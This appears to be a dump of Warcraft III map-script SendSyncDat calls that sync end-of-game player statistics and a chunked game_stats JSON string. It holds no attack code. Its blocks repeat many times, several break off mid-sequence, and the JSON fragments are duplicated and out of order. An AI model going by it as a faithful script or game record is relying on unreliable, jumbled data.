	SendSyncDat("dr.x", "10", "3", 34);
	SendSyncDat("dr.x", "10", "4", 0);
	SendSyncDat("dr.x", "10", "5", 2);
	SendSyncDat("dr.x", "10", "6", 544);
	SendSyncDat("dr.x", "10", "7", 0);
	SendSyncDat("dr.x", "10", "8_0", 1227900746);
	SendSyncDat("dr.x", "10", "8_1", 1227903809);
	SendSyncDat("dr.x", "10", "8_2", 1227895880);
	SendSyncDat("dr.x", "10", "8_3", 1227896116);
	SendSyncDat("dr.x", "10", "8_4", 0);
	SendSyncDat("dr.x", "10", "8_5", 0);
	SendSyncDat("dr.x", "10", "9", 1211117643);
	SendSyncDat("dr.x", "10", "id", 9);
	SendSyncDat("dr.x", "5", "1", 3);
	SendSyncDat("dr.x", "5", "2", 7);
	SendSyncDat("dr.x", "5", "3", 55);
	SendSyncDat("dr.x", "5", "4", 6);
	SendSyncDat("dr.x", "5", "5", 3);
	SendSyncDat("dr.x", "5", "6", 790);
	SendSyncDat("dr.x", "5", "7", 4);
	SendSyncDat("dr.x", "5", "8_0", 1227901785);
	SendSyncDat("dr.x", "5", "8_1", 1227900744);
	SendSyncDat("dr.x", "5", "8_2", 1227895376);
	SendSyncDat("dr.x", "5", "8_3", 1227903025);
	SendSyncDat("dr.x", "5", "8_4", 1227899469);
	SendSyncDat("dr.x", "5", "8_5", 1227902793);
	SendSyncDat("dr.x", "5", "9", 1432510828);
	SendSyncDat("dr.x", "5", "id", 5);
	SendSyncDat("dr.x", "11", "1", 2);
	SendSyncDat("dr.x", "1", "1", 0);
	SendSyncDat("dr.x", "1", "2", 10);
	SendSyncDat("dr.x", "1", "3", 42);
	SendSyncDat("dr.x", "1", "4", 5);
	SendSyncDat("dr.x", "1", "5", 1);
	SendSyncDat("dr.x", "1", "6", 263);
	SendSyncDat("dr.x", "1", "7", 8);
	SendSyncDat("dr.x", "1", "8_0", 1227902028);
	SendSyncDat("dr.x", "1", "8_1", 1227902281);
	SendSyncDat("dr.x", "1", "8_2", 1227903818);
	SendSyncDat("dr.x", "1", "8_3", 1227896137);
	SendSyncDat("dr.x", "1", "8_4", 1227895898);
	SendSyncDat("dr.x", "1", "8_5", 1227896116);
	SendSyncDat("dr.x", "1", "9", 1333027688);
	SendSyncDat("dr.x", "1", "id", 1);
	SendSyncDat("dr.x", "7", "1", 17);
	SendSyncDat("dr.x", "7", "2", 2);
	SendSyncDat("dr.x", "7", "3", 155);
	SendSyncDat("dr.x", "7", "4", 5);
	SendSyncDat("dr.x", "7", "5", 14);
	SendSyncDat("dr.x", "7", "6", 4586);
	SendSyncDat("dr.x", "7", "7", 36);
	SendSyncDat("dr.x", "7", "8_0", 1227900746);
	SendSyncDat("dr.x", "7", "8_1", 1227901785);
	SendSyncDat("dr.x", "7", "8_2", 1227901010);
	SendSyncDat("dr.x", "7", "8_3", 1227897158);
	SendSyncDat("dr.x", "7", "8_4", 1227900994);
	SendSyncDat("dr.x", "7", "8_5", 1227899192);
	SendSyncDat("dr.x", "7", "9", 1160786242);
	SendSyncDat("dr.x", "7", "id", 6);
	SendSyncDat("dr.x", "2", "1", 0);
	SendSyncDat("dr.x", "2", "2", 9);
	SendSyncDat("dr.x", "2", "3", 96);
	SendSyncDat("dr.x", "2", "4", 8);
	SendSyncDat("dr.x", "2", "5", 0);
	SendSyncDat("dr.x", "2", "6", 667);
	SendSyncDat("dr.x", "2", "7", 24);
	SendSyncDat("dr.x", "2", "8_0", 1227895380);
	SendSyncDat("dr.x", "2", "8_1", 1227895864);
	SendSyncDat("dr.x", "2", "8_2", 1227903025);
	SendSyncDat("dr.x", "2", "8_3", 1227896137);
	SendSyncDat("dr.x", "2", "8_4", 0);
	SendSyncDat("dr.x", "2", "8_5", 1227896921);
	SendSyncDat("dr.x", "2", "9", 1315074670);
	SendSyncDat("dr.x", "2", "id", 2);
	SendSyncDat("dr.x", "8", "1", 10);
	SendSyncDat("dr.x", "8", "2", 1);
	SendSyncDat("dr.x", "8", "3", 88);
	SendSyncDat("dr.x", "8", "4", 2);
	SendSyncDat("dr.x", "8", "5", 20);
	SendSyncDat("dr.x", "8", "6", 2070);
	SendSyncDat("dr.x", "8", "7", 0);
	SendSyncDat("dr.x", "8", "8_0", 1227895880);
	SendSyncDat("dr.x", "8", "8_1", 1227900994);
	SendSyncDat("dr.x", "8", "8_2", 1227894863);
	SendSyncDat("dr.x", "8", "8_3", 1227899213);
	SendSyncDat("dr.x", "8", "8_4", 1227902793);
	SendSyncDat("dr.x", "8", "8_5", 1227902028);
	SendSyncDat("dr.x", "8", "9", 1215128178);
	SendSyncDat("dr.x", "8", "id", 7);
	SendSyncDat("dr.x", "3", "1", 2);
	SendSyncDat("dr.x", "3", "2", 9);
	SendSyncDat("dr.x", "3", "3", 65);
	SendSyncDat("dr.x", "3", "4", 7);
	SendSyncDat("dr.x", "3", "5", 0);
	SendSyncDat("dr.x", "3", "6", 42);
	SendSyncDat("dr.x", "3", "7", 3);
	SendSyncDat("dr.x", "3", "8_0", 1227903028);
	SendSyncDat("dr.x", "3", "8_1", 1227895880);
	SendSyncDat("dr.x", "3", "8_2", 1227900746);
	SendSyncDat("dr.x", "3", "8_3", 1227896904);
	SendSyncDat("dr.x", "3", "8_4", 1227896916);
	SendSyncDat("dr.x", "3", "8_5", 0);
	SendSyncDat("dr.x", "3", "9", 1433631084);
	SendSyncDat("dr.x", "3", "id", 3);
	SendSyncDat("dr.x", "9", "1", 2);
	SendSyncDat("dr.x", "9", "2", 3);
	SendSyncDat("dr.x", "9", "3", 79);
	SendSyncDat("dr.x", "9", "4", 2);
	SendSyncDat("dr.x", "9", "5", 9);
	SendSyncDat("dr.x", "9", "6", 2529);
	SendSyncDat("dr.x", "9", "7", 16);
	SendSyncDat("dr.x", "9", "8_0", 1227902028);
	SendSyncDat("dr.x", "9", "8_1", 1227896911);
	SendSyncDat("dr.x", "9", "8_2", 1227896153);
	SendSyncDat("dr.x", "9", "8_3", 1227897137);
	SendSyncDat("dr.x", "9", "8_4", 0);
	SendSyncDat("dr.x", "9", "8_5", 0);
	SendSyncDat("dr.x", "9", "9", 1311780946);
	SendSyncDat("dr.x", "9", "id", 8);
	SendSyncDat("dr.x", "4", "1", 1);
	SendSyncDat("dr.x", "4", "2", 6);
	SendSyncDat("dr.x", "4", "3", 15);
	SendSyncDat("dr.x", "4", "4", 0);
	SendSyncDat("dr.x", "4", "5", 1);
	SendSyncDat("dr.x", "4", "6", 6);
	SendSyncDat("dr.x", "4", "7", 37);
	SendSyncDat("dr.x", "4", "8_0", 0);
	SendSyncDat("dr.x", "4", "8_1", 0);
	SendSyncDat("dr.x", "4", "8_2", 0);
	SendSyncDat("dr.x", "4", "8_3", 0);
	SendSyncDat("dr.x", "4", "8_4", 0);
	SendSyncDat("dr.x", "4", "8_5", 0);
	SendSyncDat("dr.x", "4", "9", 1332766568);
	SendSyncDat("dr.x", "4", "id", 4);
	SendSyncDat("dr.x", "10", "1", 10);
	SendSyncDat("dr.x", "10", "2", 9);
	SendSyncDat("dr.x", "10", "3", 34);
	SendSyncDat("dr.x", "10", "4", 0);
	SendSyncDat("dr.x", "10", "5", 2);
	SendSyncDat("dr.x", "10", "6", 544);
	SendSyncDat("dr.x", "10", "7", 0);
	SendSyncDat("dr.x", "10", "8_0", 1227900746);
	SendSyncDat("dr.x", "10", "8_1", 1227903809);
	SendSyncDat("dr.x", "10", "8_2", 1227895880);
	SendSyncDat("dr.x", "10", "8_3", 1227896116);
	SendSyncDat("dr.x", "10", "8_4", 0);
	SendSyncDat("dr.x", "10", "8_5", 0);
	SendSyncDat("dr.x", "10", "9", 1211117643);
	SendSyncDat("dr.x", "10", "id", 9);
	SendSyncDat("dr.x", "5", "1", 3);
	SendSyncDat("dr.x", "5", "2", 7);
	SendSyncDat("dr.x", "5", "3", 55);
	SendSyncDat("dr.x", "5", "4", 6);
	SendSyncDat("dr.x", "5", "5", 3);
	SendSyncDat("dr.x", "5", "6", 790);
	SendSyncDat("dr.x", "5", "7", 4);
	SendSyncDat("dr.x", "5", "8_0", 1227901785);
	SendSyncDat("dr.x", "5", "8_1", 1227900744);
	SendSyncDat("dr.x", "5", "8_2", 1227895376);
	SendSyncDat("dr.x", "5", "8_3", 1227903025);
	SendSyncDat("dr.x", "5", "8_4", 1227899469);
	SendSyncDat("dr.x", "5", "8_5", 1227902793);
	SendSyncDat("dr.x", "5", "9", 1432510828);
	SendSyncDat("dr.x", "5", "id", 5);
	SendSyncDat("dr.x", "11", "1", 2);
	SendSyncDat("dr.x", "11", "2", 1);
	SendSyncDat("dr.x", "11", "3", 68);
	SendSyncDat("dr.x", "11", "4", 5);
	SendSyncDat("dr.x", "11", "5", 9);
	SendSyncDat("dr.x", "11", "6", 1350);
	SendSyncDat("dr.x", "11", "7", 0);
	SendSyncDat("dr.x", "11", "8_0", 1227902265);
	SendSyncDat("dr.x", "11", "8_1", 1227896907);
	SendSyncDat("dr.x", "11", "8_2", 1227895380);
	SendSyncDat("dr.x", "11", "8_3", 1227896921);
	SendSyncDat("dr.x", "11", "8_4", 1227900994);
	SendSyncDat("dr.x", "11", "8_5", 0);
	SendSyncDat("dr.x", "11", "9", 1212365106);
	SendSyncDat("dr.x", "11", "id", 10);
	SendSyncDat("dr.x", "Global", "Winner", 2);
	SendSyncDat("dr.x", "Global", "m", 27);
	SendSyncDat("dr.x", "Global", "s", 58);
	SendSyncDat("dr.x", "game_stats", "{\"first_hero_kill_time\":262,\"game_start_time\":279,\"players\":[{\"assists\":1,\"courier_kills\":0,\"creep_denies\":5,\"creep_kills\":42,\"d", 1);
	SendSyncDat("dr.x", "1", "1", 0);
	SendSyncDat("dr.x", "1", "2", 10);
	SendSyncDat("dr.x", "1", "3", 42);
	SendSyncDat("dr.x", "1", "4", 5);
	SendSyncDat("dr.x", "1", "5", 1);
	SendSyncDat("dr.x", "1", "6", 263);
	SendSyncDat("dr.x", "1", "7", 8);
	SendSyncDat("dr.x", "1", "8_0", 1227902028);
	SendSyncDat("dr.x", "1", "8_1", 1227902281);
	SendSyncDat("dr.x", "1", "8_2", 1227903818);
	SendSyncDat("dr.x", "1", "8_3", 1227896137);
	SendSyncDat("dr.x", "1", "8_4", 1227895898);
	SendSyncDat("dr.x", "1", "8_5", 1227896116);
	SendSyncDat("dr.x", "1", "9", 1333027688);
	SendSyncDat("dr.x", "1", "id", 1);
	SendSyncDat("dr.x", "7", "1", 17);
	SendSyncDat("dr.x", "7", "2", 2);
	SendSyncDat("dr.x", "7", "3", 155);
	SendSyncDat("dr.x", "7", "4", 5);
	SendSyncDat("dr.x", "7", "5", 14);
	SendSyncDat("dr.x", "7", "6", 4586);
	SendSyncDat("dr.x", "7", "7", 36);
	SendSyncDat("dr.x", "7", "8_0", 1227900746);
	SendSyncDat("dr.x", "7", "8_1", 1227901785);
	SendSyncDat("dr.x", "7", "8_2", 1227901010);
	SendSyncDat("dr.x", "7", "8_3", 1227897158);
	SendSyncDat("dr.x", "7", "8_4", 1227900994);
	SendSyncDat("dr.x", "7", "8_5", 1227899192);
	SendSyncDat("dr.x", "7", "9", 1160786242);
	SendSyncDat("dr.x", "7", "id", 6);
	SendSyncDat("dr.x", "2", "1", 0);
	SendSyncDat("dr.x", "2", "2", 9);
	SendSyncDat("dr.x", "2", "3", 96);
	SendSyncDat("dr.x", "2", "4", 8);
	SendSyncDat("dr.x", "2", "5", 0);
	SendSyncDat("dr.x", "2", "6", 667);
	SendSyncDat("dr.x", "2", "7", 24);
	SendSyncDat("dr.x", "2", "8_0", 1227895380);
	SendSyncDat("dr.x", "2", "8_1", 1227895864);
	SendSyncDat("dr.x", "2", "8_2", 1227903025);
	SendSyncDat("dr.x", "2", "8_3", 1227896137);
	SendSyncDat("dr.x", "2", "8_4", 0);
	SendSyncDat("dr.x", "2", "8_5", 1227896921);
	SendSyncDat("dr.x", "2", "9", 1315074670);
	SendSyncDat("dr.x", "2", "id", 2);
	SendSyncDat("dr.x", "8", "1", 10);
	SendSyncDat("dr.x", "8", "2", 1);
	SendSyncDat("dr.x", "8", "3", 88);
	SendSyncDat("dr.x", "8", "4", 2);
	SendSyncDat("dr.x", "8", "5", 20);
	SendSyncDat("dr.x", "8", "6", 2070);
	SendSyncDat("dr.x", "8", "7", 0);
	SendSyncDat("dr.x", "8", "8_0", 1227895880);
	SendSyncDat("dr.x", "8", "8_1", 1227900994);
	SendSyncDat("dr.x", "8", "8_2", 1227894863);
	SendSyncDat("dr.x", "8", "8_3", 1227899213);
	SendSyncDat("dr.x", "8", "8_4", 1227902793);
	SendSyncDat("dr.x", "8", "8_5", 1227902028);
	SendSyncDat("dr.x", "8", "9", 1215128178);
	SendSyncDat("dr.x", "8", "id", 7);
	SendSyncDat("dr.x", "3", "1", 2);
	SendSyncDat("dr.x", "3", "2", 9);
	SendSyncDat("dr.x", "3", "3", 65);
	SendSyncDat("dr.x", "3", "4", 7);
	SendSyncDat("dr.x", "3", "5", 0);
	SendSyncDat("dr.x", "3", "6", 42);
	SendSyncDat("dr.x", "3", "7", 3);
	SendSyncDat("dr.x", "3", "8_0", 1227903028);
	SendSyncDat("dr.x", "3", "8_1", 1227895880);
	SendSyncDat("dr.x", "3", "8_2", 1227900746);
	SendSyncDat("dr.x", "3", "8_3", 1227896904);
	SendSyncDat("dr.x", "3", "8_4", 1227896916);
	SendSyncDat("dr.x", "3", "8_5", 0);
	SendSyncDat("dr.x", "3", "9", 1433631084);
	SendSyncDat("dr.x", "3", "id", 3);
	SendSyncDat("dr.x", "9", "1", 2);
	SendSyncDat("dr.x", "9", "2", 3);
	SendSyncDat("dr.x", "9", "3", 79);
	SendSyncDat("dr.x", "9", "4", 2);
	SendSyncDat("dr.x", "9", "5", 9);
	SendSyncDat("dr.x", "9", "6", 2529);
	SendSyncDat("dr.x", "9", "7", 16);
	SendSyncDat("dr.x", "9", "8_0", 1227902028);
	SendSyncDat("dr.x", "9", "8_1", 1227896911);
	SendSyncDat("dr.x", "9", "8_2", 1227896153);
	SendSyncDat("dr.x", "9", "8_3", 1227897137);
	SendSyncDat("dr.x", "9", "8_4", 0);
	SendSyncDat("dr.x", "9", "8_5", 0);
	SendSyncDat("dr.x", "9", "9", 1311780946);
	SendSyncDat("dr.x", "9", "id", 8);
	SendSyncDat("dr.x", "4", "1", 1);
	SendSyncDat("dr.x", "4", "2", 6);
	SendSyncDat("dr.x", "4", "3", 15);
	SendSyncDat("dr.x", "4", "4", 0);
	SendSyncDat("dr.x", "4", "5", 1);
	SendSyncDat("dr.x", "4", "6", 6);
	SendSyncDat("dr.x", "4", "7", 37);
	SendSyncDat("dr.x", "4", "8_0", 0);
	SendSyncDat("dr.x", "4", "8_1", 0);
	SendSyncDat("dr.x", "4", "8_2", 0);
	SendSyncDat("dr.x", "4", "8_3", 0);
	SendSyncDat("dr.x", "4", "8_4", 0);
	SendSyncDat("dr.x", "4", "8_5", 0);
	SendSyncDat("dr.x", "4", "9", 1332766568);
	SendSyncDat("dr.x", "4", "id", 4);
	SendSyncDat("dr.x", "10", "1", 10);
	SendSyncDat("dr.x", "10", "2", 9);
	SendSyncDat("dr.x", "10", "3", 34);
	SendSyncDat("dr.x", "10", "4", 0);
	SendSyncDat("dr.x", "10", "5", 2);
	SendSyncDat("dr.x", "10", "6", 544);
	SendSyncDat("dr.x", "10", "7", 0);
	SendSyncDat("dr.x", "10", "8_0", 1227900746);
	SendSyncDat("dr.x", "10", "8_1", 1227903809);
	SendSyncDat("dr.x", "10", "8_2", 1227895880);
	SendSyncDat("dr.x", "10", "8_3", 1227896116);
	SendSyncDat("dr.x", "10", "8_4", 0);
	SendSyncDat("dr.x", "10", "8_5", 0);
	SendSyncDat("dr.x", "10", "9", 1211117643);
	SendSyncDat("dr.x", "10", "id", 9);
	SendSyncDat("dr.x", "5", "1", 3);
	SendSyncDat("dr.x", "5", "2", 7);
	SendSyncDat("dr.x", "5", "3", 55);
	SendSyncDat("dr.x", "5", "4", 6);
	SendSyncDat("dr.x", "5", "5", 3);
	SendSyncDat("dr.x", "5", "6", 790);
	SendSyncDat("dr.x", "5", "7", 4);
	SendSyncDat("dr.x", "5", "8_0", 1227901785);
	SendSyncDat("dr.x", "5", "8_1", 1227900744);
	SendSyncDat("dr.x", "5", "8_2", 1227895376);
	SendSyncDat("dr.x", "5", "8_3", 1227903025);
	SendSyncDat("dr.x", "5", "8_4", 1227899469);
	SendSyncDat("dr.x", "5", "8_5", 1227902793);
	SendSyncDat("dr.x", "5", "9", 1432510828);
	SendSyncDat("dr.x", "5", "id", 5);
	SendSyncDat("dr.x", "11", "1", 2);
	SendSyncDat("dr.x", "1", "1", 0);
	SendSyncDat("dr.x", "1", "2", 10);
	SendSyncDat("dr.x", "1", "3", 42);
	SendSyncDat("dr.x", "1", "4", 5);
	SendSyncDat("dr.x", "1", "5", 1);
	SendSyncDat("dr.x", "1", "6", 263);
	SendSyncDat("dr.x", "1", "7", 8);
	SendSyncDat("dr.x", "1", "8_0", 1227902028);
	SendSyncDat("dr.x", "1", "8_1", 1227902281);
	SendSyncDat("dr.x", "1", "8_2", 1227903818);
	SendSyncDat("dr.x", "1", "8_3", 1227896137);
	SendSyncDat("dr.x", "1", "8_4", 1227895898);
	SendSyncDat("dr.x", "1", "8_5", 1227896116);
	SendSyncDat("dr.x", "1", "9", 1333027688);
	SendSyncDat("dr.x", "1", "id", 1);
	SendSyncDat("dr.x", "7", "1", 17);
	SendSyncDat("dr.x", "7", "2", 2);
	SendSyncDat("dr.x", "7", "3", 155);
	SendSyncDat("dr.x", "7", "4", 5);
	SendSyncDat("dr.x", "7", "5", 14);
	SendSyncDat("dr.x", "7", "6", 4586);
	SendSyncDat("dr.x", "7", "7", 36);
	SendSyncDat("dr.x", "7", "8_0", 1227900746);
	SendSyncDat("dr.x", "7", "8_1", 1227901785);
	SendSyncDat("dr.x", "7", "8_2", 1227901010);
	SendSyncDat("dr.x", "7", "8_3", 1227897158);
	SendSyncDat("dr.x", "7", "8_4", 1227900994);
	SendSyncDat("dr.x", "7", "8_5", 1227899192);
	SendSyncDat("dr.x", "7", "9", 1160786242);
	SendSyncDat("dr.x", "7", "id", 6);
	SendSyncDat("dr.x", "2", "1", 0);
	SendSyncDat("dr.x", "2", "2", 9);
	SendSyncDat("dr.x", "2", "3", 96);
	SendSyncDat("dr.x", "2", "4", 8);
	SendSyncDat("dr.x", "2", "5", 0);
	SendSyncDat("dr.x", "2", "6", 667);
	SendSyncDat("dr.x", "2", "7", 24);
	SendSyncDat("dr.x", "2", "8_0", 1227895380);
	SendSyncDat("dr.x", "2", "8_1", 1227895864);
	SendSyncDat("dr.x", "2", "8_2", 1227903025);
	SendSyncDat("dr.x", "2", "8_3", 1227896137);
	SendSyncDat("dr.x", "2", "8_4", 0);
	SendSyncDat("dr.x", "2", "8_5", 1227896921);
	SendSyncDat("dr.x", "2", "9", 1315074670);
	SendSyncDat("dr.x", "2", "id", 2);
	SendSyncDat("dr.x", "8", "1", 10);
	SendSyncDat("dr.x", "8", "2", 1);
	SendSyncDat("dr.x", "8", "3", 88);
	SendSyncDat("dr.x", "8", "4", 2);
	SendSyncDat("dr.x", "8", "5", 20);
	SendSyncDat("dr.x", "8", "6", 2070);
	SendSyncDat("dr.x", "8", "7", 0);
	SendSyncDat("dr.x", "8", "8_0", 1227895880);
	SendSyncDat("dr.x", "8", "8_1", 1227900994);
	SendSyncDat("dr.x", "8", "8_2", 1227894863);
	SendSyncDat("dr.x", "8", "8_3", 1227899213);
	SendSyncDat("dr.x", "8", "8_4", 1227902793);
	SendSyncDat("dr.x", "8", "8_5", 1227902028);
	SendSyncDat("dr.x", "8", "9", 1215128178);
	SendSyncDat("dr.x", "8", "id", 7);
	SendSyncDat("dr.x", "3", "1", 2);
	SendSyncDat("dr.x", "3", "2", 9);
	SendSyncDat("dr.x", "3", "3", 65);
	SendSyncDat("dr.x", "3", "4", 7);
	SendSyncDat("dr.x", "3", "5", 0);
	SendSyncDat("dr.x", "3", "6", 42);
	SendSyncDat("dr.x", "3", "7", 3);
	SendSyncDat("dr.x", "3", "8_0", 1227903028);
	SendSyncDat("dr.x", "3", "8_1", 1227895880);
	SendSyncDat("dr.x", "11", "2", 1);
	SendSyncDat("dr.x", "11", "3", 68);
	SendSyncDat("dr.x", "11", "4", 5);
	SendSyncDat("dr.x", "11", "5", 9);
	SendSyncDat("dr.x", "11", "6", 1350);
	SendSyncDat("dr.x", "11", "7", 0);
	SendSyncDat("dr.x", "11", "8_0", 1227902265);
	SendSyncDat("dr.x", "11", "8_1", 1227896907);
	SendSyncDat("dr.x", "11", "8_2", 1227895380);
	SendSyncDat("dr.x", "11", "8_3", 1227896921);
	SendSyncDat("dr.x", "11", "8_4", 1227900994);
	SendSyncDat("dr.x", "11", "8_5", 0);
	SendSyncDat("dr.x", "11", "9", 1212365106);
	SendSyncDat("dr.x", "11", "id", 10);
	SendSyncDat("dr.x", "Global", "Winner", 2);
	SendSyncDat("dr.x", "Global", "m", 27);
	SendSyncDat("dr.x", "Global", "s", 58);
	SendSyncDat("dr.x", "game_stats", "{\"first_hero_kill_time\":262,\"game_start_time\":279,\"players\":[{\"assists\":1,\"courier_kills\":0,\"creep_denies\":5,\"creep_kills\":42,\"d", 1);
	SendSyncDat("dr.x", "game_stats", ",\"gold\":667,\"hero\":1315074670,\"id\":2,\"items\":[1227895380,1227895864,1227903025,1227896137,0,1227896921],\"kills\":0,\"left_time\":0,", 1);
	SendSyncDat("dr.x", "game_stats", "\"neutral_kills\":24,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":2},{\"assists\":0,\"courier_", 1);
	SendSyncDat("dr.x", "11", "2", 1);
	SendSyncDat("dr.x", "11", "3", 68);
	SendSyncDat("dr.x", "11", "4", 5);
	SendSyncDat("dr.x", "11", "5", 9);
	SendSyncDat("dr.x", "11", "6", 1350);
	SendSyncDat("dr.x", "11", "7", 0);
	SendSyncDat("dr.x", "11", "8_0", 1227902265);
	SendSyncDat("dr.x", "11", "8_1", 1227896907);
	SendSyncDat("dr.x", "11", "8_2", 1227895380);
	SendSyncDat("dr.x", "11", "8_3", 1227896921);
	SendSyncDat("dr.x", "11", "8_4", 1227900994);
	SendSyncDat("dr.x", "11", "8_5", 0);
	SendSyncDat("dr.x", "11", "9", 1212365106);
	SendSyncDat("dr.x", "11", "id", 10);
	SendSyncDat("dr.x", "Global", "Winner", 2);
	SendSyncDat("dr.x", "Global", "m", 27);
	SendSyncDat("dr.x", "Global", "s", 58);
	SendSyncDat("dr.x", "game_stats", "{\"first_hero_kill_time\":262,\"game_start_time\":279,\"players\":[{\"assists\":1,\"courier_kills\":0,\"creep_denies\":5,\"creep_kills\":42,\"d", 1);
	SendSyncDat("dr.x", "game_stats", "eaths\":10,\"firestone\":0,\"froststone\":0,\"gold\":263,\"hero\":1333027688,\"id\":1,\"items\":[1227902028,1227902281,1227903818,1227896137,", 1);
	SendSyncDat("dr.x", "game_stats", "1227895898,1227896116],\"kills\":0,\"left_time\":0,\"neutral_kills\":8,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_ki", 1);
	SendSyncDat("dr.x", "game_stats", "lls\":0,\"tower_kills\":0},{\"assists\":0,\"courier_kills\":0,\"creep_denies\":8,\"creep_kills\":96,\"deaths\":9,\"firestone\":0,\"froststone\":0", 1);
	SendSyncDat("dr.x", "game_stats", "eaths\":10,\"firestone\":0,\"froststone\":0,\"gold\":263,\"hero\":1333027688,\"id\":1,\"items\":[1227902028,1227902281,1227903818,1227896137,", 1);
	SendSyncDat("dr.x", "game_stats", "1227895898,1227896116],\"kills\":0,\"left_time\":0,\"neutral_kills\":8,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_ki", 1);
	SendSyncDat("dr.x", "game_stats", "lls\":0,\"tower_kills\":0},{\"assists\":0,\"courier_kills\":0,\"creep_denies\":8,\"creep_kills\":96,\"deaths\":9,\"firestone\":0,\"froststone\":0", 1);
	SendSyncDat("dr.x", "game_stats", ",\"gold\":667,\"hero\":1315074670,\"id\":2,\"items\":[1227895380,1227895864,1227903025,1227896137,0,1227896921],\"kills\":0,\"left_time\":0,", 1);
	SendSyncDat("dr.x", "game_stats", "\"neutral_kills\":24,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":2},{\"assists\":0,\"courier_", 1);
	SendSyncDat("dr.x", "game_stats", "kills\":0,\"creep_denies\":7,\"creep_kills\":65,\"deaths\":9,\"firestone\":0,\"froststone\":0,\"gold\":42,\"hero\":1433631084,\"id\":3,\"items\":[1", 1);
	SendSyncDat("dr.x", "game_stats", "227903028,1227895880,1227900746,1227896904,1227896916,0],\"kills\":2,\"left_time\":0,\"neutral_kills\":3,\"new_year_bounty_find\":0,\"new", 1);
	SendSyncDat("dr.x", "game_stats", "_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":0},{\"assists\":1,\"courier_kills\":0,\"creep_denies\":0,\"creep_kills\":15,\"deat", 1);
	SendSyncDat("dr.x", "3", "8_2", 1227900746);
	SendSyncDat("dr.x", "3", "8_3", 1227896904);
	SendSyncDat("dr.x", "3", "8_4", 1227896916);
	SendSyncDat("dr.x", "3", "8_5", 0);
	SendSyncDat("dr.x", "3", "9", 1433631084);
	SendSyncDat("dr.x", "3", "id", 3);
	SendSyncDat("dr.x", "9", "1", 2);
	SendSyncDat("dr.x", "9", "2", 3);
	SendSyncDat("dr.x", "9", "3", 79);
	SendSyncDat("dr.x", "9", "4", 2);
	SendSyncDat("dr.x", "9", "5", 9);
	SendSyncDat("dr.x", "9", "6", 2529);
	SendSyncDat("dr.x", "9", "7", 16);
	SendSyncDat("dr.x", "9", "8_0", 1227902028);
	SendSyncDat("dr.x", "9", "8_1", 1227896911);
	SendSyncDat("dr.x", "9", "8_2", 1227896153);
	SendSyncDat("dr.x", "9", "8_3", 1227897137);
	SendSyncDat("dr.x", "9", "8_4", 0);
	SendSyncDat("dr.x", "9", "8_5", 0);
	SendSyncDat("dr.x", "9", "9", 1311780946);
	SendSyncDat("dr.x", "9", "id", 8);
	SendSyncDat("dr.x", "4", "1", 1);
	SendSyncDat("dr.x", "4", "2", 6);
	SendSyncDat("dr.x", "4", "3", 15);
	SendSyncDat("dr.x", "4", "4", 0);
	SendSyncDat("dr.x", "4", "5", 1);
	SendSyncDat("dr.x", "4", "6", 6);
	SendSyncDat("dr.x", "4", "7", 37);
	SendSyncDat("dr.x", "4", "8_0", 0);
	SendSyncDat("dr.x", "4", "8_1", 0);
	SendSyncDat("dr.x", "4", "8_2", 0);
	SendSyncDat("dr.x", "4", "8_3", 0);
	SendSyncDat("dr.x", "4", "8_4", 0);
	SendSyncDat("dr.x", "4", "8_5", 0);
	SendSyncDat("dr.x", "4", "9", 1332766568);
	SendSyncDat("dr.x", "4", "id", 4);
	SendSyncDat("dr.x", "10", "1", 10);
	SendSyncDat("dr.x", "10", "2", 9);
	SendSyncDat("dr.x", "10", "3", 34);
	SendSyncDat("dr.x", "10", "4", 0);
	SendSyncDat("dr.x", "10", "5", 2);
	SendSyncDat("dr.x", "10", "6", 544);
	SendSyncDat("dr.x", "10", "7", 0);
	SendSyncDat("dr.x", "10", "8_0", 1227900746);
	SendSyncDat("dr.x", "10", "8_1", 1227903809);
	SendSyncDat("dr.x", "10", "8_2", 1227895880);
	SendSyncDat("dr.x", "10", "8_3", 1227896116);
	SendSyncDat("dr.x", "10", "8_4", 0);
	SendSyncDat("dr.x", "10", "8_5", 0);
	SendSyncDat("dr.x", "10", "9", 1211117643);
	SendSyncDat("dr.x", "10", "id", 9);
	SendSyncDat("dr.x", "5", "1", 3);
	SendSyncDat("dr.x", "5", "2", 7);
	SendSyncDat("dr.x", "5", "3", 55);
	SendSyncDat("dr.x", "5", "4", 6);
	SendSyncDat("dr.x", "5", "5", 3);
	SendSyncDat("dr.x", "5", "6", 790);
	SendSyncDat("dr.x", "5", "7", 4);
	SendSyncDat("dr.x", "5", "8_0", 1227901785);
	SendSyncDat("dr.x", "5", "8_1", 1227900744);
	SendSyncDat("dr.x", "5", "8_2", 1227895376);
	SendSyncDat("dr.x", "5", "8_3", 1227903025);
	SendSyncDat("dr.x", "5", "8_4", 1227899469);
	SendSyncDat("dr.x", "5", "8_5", 1227902793);
	SendSyncDat("dr.x", "5", "9", 1432510828);
	SendSyncDat("dr.x", "5", "id", 5);
	SendSyncDat("dr.x", "11", "1", 2);
	SendSyncDat("dr.x", "11", "2", 1);
	SendSyncDat("dr.x", "11", "3", 68);
	SendSyncDat("dr.x", "11", "4", 5);
	SendSyncDat("dr.x", "11", "5", 9);
	SendSyncDat("dr.x", "11", "6", 1350);
	SendSyncDat("dr.x", "11", "7", 0);
	SendSyncDat("dr.x", "11", "8_0", 1227902265);
	SendSyncDat("dr.x", "11", "8_1", 1227896907);
	SendSyncDat("dr.x", "11", "8_2", 1227895380);
	SendSyncDat("dr.x", "11", "8_3", 1227896921);
	SendSyncDat("dr.x", "11", "8_4", 1227900994);
	SendSyncDat("dr.x", "11", "8_5", 0);
	SendSyncDat("dr.x", "11", "9", 1212365106);
	SendSyncDat("dr.x", "11", "id", 10);
	SendSyncDat("dr.x", "Global", "Winner", 2);
	SendSyncDat("dr.x", "Global", "m", 27);
	SendSyncDat("dr.x", "Global", "s", 58);
	SendSyncDat("dr.x", "game_stats", "{\"first_hero_kill_time\":262,\"game_start_time\":279,\"players\":[{\"assists\":1,\"courier_kills\":0,\"creep_denies\":5,\"creep_kills\":42,\"d", 1);
	SendSyncDat("dr.x", "11", "2", 1);
	SendSyncDat("dr.x", "11", "3", 68);
	SendSyncDat("dr.x", "11", "4", 5);
	SendSyncDat("dr.x", "11", "5", 9);
